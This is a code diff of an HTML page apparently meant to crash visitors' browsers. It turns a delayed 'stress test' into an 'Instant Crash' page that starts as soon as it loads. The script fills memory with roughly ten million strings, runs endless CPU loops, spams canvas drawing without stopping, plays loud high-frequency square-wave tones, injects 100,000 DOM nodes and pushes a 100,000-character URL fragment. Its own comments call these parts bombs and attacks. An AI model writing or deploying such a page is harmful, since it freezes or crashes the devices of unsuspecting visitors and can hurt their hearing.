@@ -1,87 +1,73 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>💥 Ultra Crash Test</title>
+  <title>💥 Instant Crash Test</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    html, body { height: 100%; background: black; color: lime; font-family: monospace; overflow: hidden; }
-    h1 { text-align: center; margin-top: 30px; font-size: 24px; }
+    * { margin: 0; padding: 0; }
+    html, body {
+      width: 100%; height: 100%;
+      background: black; color: lime;
+      font-family: monospace;
+      overflow: hidden;
+    }
   </style>
 </head>
 <body>
-  <h1>🚨 Ultra Browser Stress Test 🚨</h1>
+  <h1>☠️ Instant Crash Triggered</h1>
   <script>
-    // 1. 🧠 RAM Bomb: Inflate a massive array
+    // 1. 💥 Max RAM Flood: Allocate huge arrays fast
     let ramArray = [];
-    function fillRAM() {
-      try {
-        for (let i = 0; i < 1e6; i++) {
-          ramArray.push("💣".repeat(1000)); // ~1KB per push
+    for (let i = 0; i < 1e7; i++) {
+      ramArray.push("💣".repeat(1000)); // ~1KB per item
+    }
+
+    // 2. ⚙️ Max CPU Burn: Infinite math storm (spawns multiple threads if allowed)
+    for (let i = 0; i < 4; i++) {
+      setTimeout(() => {
+        while (true) {
+          Math.pow(Math.random(), Math.random()) * Date.now();
         }
-        setTimeout(fillRAM, 10); // keep adding
-      } catch (e) {
-        console.log("RAM limit hit:", e);
-      }
+      }, 0);
     }
 
-    // 2. ⚙️ CPU Bomb: Continuous math loop
-    function burnCPU() {
-      while (true) {
-        Math.pow(Math.random(), Math.random()) * Date.now();
+    // 3. 🎨 GPU Abuse: Max canvas spam immediately
+    const canvas = document.createElement("canvas");
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    document.body.appendChild(canvas);
+    const ctx = canvas.getContext("2d");
+    function spamGPU() {
+      for (let i = 0; i < 20000; i++) {
+        ctx.fillStyle = `rgb(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255})`;
+        ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, 2, 2);
       }
+      requestAnimationFrame(spamGPU);
+    }
+    spamGPU();
+
+    // 4. 🔊 Audio Thread Storm: Multiple oscillators nonstop
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    for (let i = 0; i < 5; i++) {
+      const osc = audioCtx.createOscillator();
+      osc.type = "square";
+      osc.frequency.setValueAtTime(16000 + Math.random()*3000, audioCtx.currentTime);
+      osc.connect(audioCtx.destination);
+      osc.start();
+      osc.stop(audioCtx.currentTime + 0.5);
     }
 
-    // 3. 🎨 GPU Bomb: Canvas visual storm
-    function overloadGPU() {
-      const canvas = document.createElement("canvas");
-      document.body.appendChild(canvas);
-      canvas.width = window.innerWidth;
-      canvas.height = window.innerHeight;
-      const ctx = canvas.getContext("2d");
-      function draw() {
-        for (let i = 0; i < 5000; i++) {
-          ctx.fillStyle = `rgb(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255})`;
-          ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, 4, 4);
-        }
-        requestAnimationFrame(draw);
-      }
-      draw();
+    // 5. 🧬 DOM Injection Bomb: Inject 1000s of nodes in milliseconds
+    const container = document.createElement("div");
+    document.body.appendChild(container);
+    for (let i = 0; i < 1e5; i++) {
+      const d = document.createElement("div");
+      d.textContent = "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥";
+      container.appendChild(d);
     }
 
-    // 4. 🔊 Audio Bomb: Stress audio threads
-    function noiseAttack() {
-      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-      function beep() {
-        const oscillator = audioCtx.createOscillator();
-        oscillator.type = "sawtooth";
-        oscillator.frequency.setValueAtTime(18000 + Math.random()*2000, audioCtx.currentTime);
-        oscillator.connect(audioCtx.destination);
-        oscillator.start();
-        oscillator.stop(audioCtx.currentTime + 0.3);
-        setTimeout(beep, 100);
-      }
-      beep();
-    }
+    // 6. 🌪️ URL Fragment Lag (some mobile browsers die on this)
+    history.pushState({}, "", "#" + "X".repeat(100000));
 
-    // 5. 🧬 DOM Bomb: Infinite node injection
-    function floodDOM() {
-      const container = document.createElement("div");
-      document.body.appendChild(container);
-      while (true) {
-        const spam = document.createElement("div");
-        spam.textContent = "🔥".repeat(500);
-        container.appendChild(spam);
-      }
-    }
-
-    // Launch all attacks after a short delay
-    setTimeout(() => {
-      fillRAM();              // RAM flood
-      setTimeout(overloadGPU, 500);   // GPU overload
-      setTimeout(noiseAttack, 1000);  // Audio thread stress
-      setTimeout(floodDOM, 1500);     // DOM memory usage
-      setTimeout(burnCPU, 2000);      // CPU meltdown (runs last to avoid blocking others)
-    }, 1000);
   </script>
 </body>
 </html>
